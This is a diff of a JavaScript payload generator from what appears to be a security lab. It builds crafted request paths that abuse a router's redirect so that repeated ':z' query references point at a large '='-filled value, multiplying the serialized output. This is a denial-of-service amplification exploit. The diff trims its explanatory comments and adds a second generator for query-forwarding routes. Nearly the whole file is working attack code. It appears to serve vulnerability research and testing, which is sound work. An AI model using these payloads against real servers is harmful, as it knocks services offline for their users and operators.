@@ -1,31 +1,13 @@
-// Request-target generator for the lab.
+// Request targets for the lab. The output is references x serialized length of the value
+// they point at, so half the bytes buy `:z` references and half buy the `z` value.
 //
-// The amplifier is `output = references x serialized length of the referenced value`.
-// Both factors come out of the same request, so the request is split in half: half of
-// the bytes buy references, half buy the value they point at.
+//   /restaurant/<head>%3F<key>=:z&<key>=:z...&/menu?z=<fill>&meal=x
 //
-// Shape:  /restaurant/<location>/menu?z=<fill>&meal=x
-//
-//   location = "x%3F" + "<key>=:z" + "&<key>=:z" ... + "&"
-//     The redirect function returns `/restaurant/${location}/menu/${meal}`, so the
-//     decoded location decides how that string parses. `%3F` opens a query, and every
-//     `<key>=:z` after it becomes one reference to the request's own `z` parameter.
-//     Separators are raw `&`: SEGMENT_RE (/^[^\/()?;#]+/) accepts `&` inside a path
-//     segment, so a reference costs 5 bytes instead of the 7 it costs inside a query
-//     value, where `&` has to be written `%26`.
-//
-//   fill = "=" repeated
-//     `=` is one byte in a query value (QUERY_PARAM_VALUE_RE is /^[^&#]+/) and
-//     `encodeUriQuery` writes it back as `%3D`, so every fill byte is serialized as
-//     three. That is the largest expansion available: `encodeUriString` un-escapes
-//     `%40`, `%3A`, `%24`, `%2C` and `%3B`, so `@ : $ , ;` stay one byte, and llhttp
-//     answers 400 to every byte outside 0x21-0x7e, which rules out the 6x expansion
-//     of raw non-ASCII.
-//
-// Keys are distinct because `parseQueryParam` collapses a repeated key into an array,
-// and `createQueryParams` only substitutes string values. They are drawn shortest
-// first from the 73 characters that are RFC 3986 `pchar`, legal in a query-parameter
-// name, and legal unencoded inside a path segment.
+// The redirect returns `/restaurant/${location}/menu/${meal}`, so `%3F` inside `location`
+// opens a query and each `<key>=:z` after it references `z`. A raw `&` is legal in a path
+// segment, so a reference costs about 6 bytes. The fill is `=`, which `encodeUriQuery`
+// writes back as `%3D`: three bytes out per byte in, the most for any byte Node accepts.
+// Keys are distinct, since a repeated key parses to an array and arrays are not substituted.
 const KEY_CHARS =
   "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-._~!$'*,:@";
 
@@ -35,23 +17,18 @@ function* keyNames() {
   for (const a of KEY_CHARS) for (const b of KEY_CHARS) for (const c of KEY_CHARS) yield a + b + c;
 }
 
-// Two heads, because the redirect's PATH decides whether its destination is routable
-// at all, and an unroutable destination is answered 404 without ever serializing the
-// tree, which is where the cost is.
-//
-//   'x%3F'                  -> /restaurant/x?<query>            2 segments, needs a
-//                              catch-all route to be reachable
-//   'a%2Fmenu%2Flunch%3F'   -> /restaurant/a/menu/lunch?<query>  matches the guide's own
-//                              destination route, so no catch-all is needed, but the
-//                              redirect route needs pathMatch: 'full' or it re-matches
-//                              by prefix and the chain drops the query
+// The redirect only amplifies when its destination is routable:
+//   catchAll     -> /restaurant/x?<query>, needs the `**` route
+//   destination  -> /restaurant/a/menu/lunch?<query>, the guide's own lunch route
 const HEADS = { catchAll: '/restaurant/x%3F', destination: '/restaurant/a%2Fmenu%2Flunch%3F' };
 
-export function payload(targetBytes, control, land = 'destination') {
+// `casePrefix` aims the request at a case route (cases.mjs). `mealValue` pins the branch so
+// the result does not depend on the hour; a case that puts it in the path needs 'lunch'.
+export function payload(targetBytes, control, land = 'destination', casePrefix = '', mealValue = 'x') {
   const sigil = control ? '@' : ':';
-  const head = HEADS[land] ?? HEADS.catchAll;
+  const head = casePrefix + (HEADS[land] ?? HEADS.catchAll);
   const tail = '/menu?z=';
-  const meal = '&meal=x';
+  const meal = `&meal=${mealValue}`;
   // Half the budget buys references; `refBytes` is measured on the wire.
   const refBytes = Math.round((targetBytes - head.length - tail.length - meal.length) / 2);
   const refs = [];
@@ -66,5 +43,45 @@ export function payload(targetBytes, control, land = 'destination') {
   const fillBytes = targetBytes - prefix.length - meal.length;
   if (fillBytes <= 0) throw new Error(`targetBytes ${targetBytes} is too small`);
   const path = prefix + '='.repeat(fillBytes) + meal;
+  return { path, markers: refs.length, refs: refs.length, fillBytes };
+}
+
+// Second generator, for the cases that forward the query string: the references are
+// ordinary query parameters of the request.
+//
+//   /<case>/restaurant/d/menu?z=<fill>&<key>=:z&<key>=:z...
+//
+// A bare `:` is legal in a query value, so nothing is percent-encoded by the request.
+// `encodeURIComponent` writes it as `%3A` and parsing the redirect decodes it back before
+// the `:` test, so encoding changes nothing. Keys start with a letter, so none is
+// integer-like (#70908), and skip FILL_KEY, since a repeated key parses to an array.
+const LETTERS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+const TAIL_CHARS = LETTERS + '0123456789';
+const FILL_KEY = 'z';
+
+function* queryKeyNames() {
+  for (const a of LETTERS) if (a !== FILL_KEY) yield a;
+  for (const a of LETTERS) for (const b of TAIL_CHARS) yield a + b;
+  for (const a of LETTERS) for (const b of TAIL_CHARS) for (const c of TAIL_CHARS) yield a + b + c;
+}
+
+export function queryPayload(targetBytes, control, caseName) {
+  const sigil = control ? '@' : ':';
+  const head = `/${caseName}/restaurant/d/menu?${FILL_KEY}=`;
+  const budget = targetBytes - head.length;
+  if (budget <= 0) throw new Error(`targetBytes ${targetBytes} is too small for ${caseName}`);
+  // Half the budget buys references, half buys the value they point at.
+  const refBytes = Math.round(budget / 2);
+  const refs = [];
+  let spent = 0;
+  for (const key of queryKeyNames()) {
+    const ref = `&${key}=${sigil}${FILL_KEY}`;
+    if (spent + ref.length > refBytes) break;
+    refs.push(ref);
+    spent += ref.length;
+  }
+  const fillBytes = budget - spent;
+  if (fillBytes <= 0) throw new Error(`targetBytes ${targetBytes} is too small for ${caseName}`);
+  const path = head + '='.repeat(fillBytes) + refs.join('');
   return { path, markers: refs.length, refs: refs.length, fillBytes };
 }
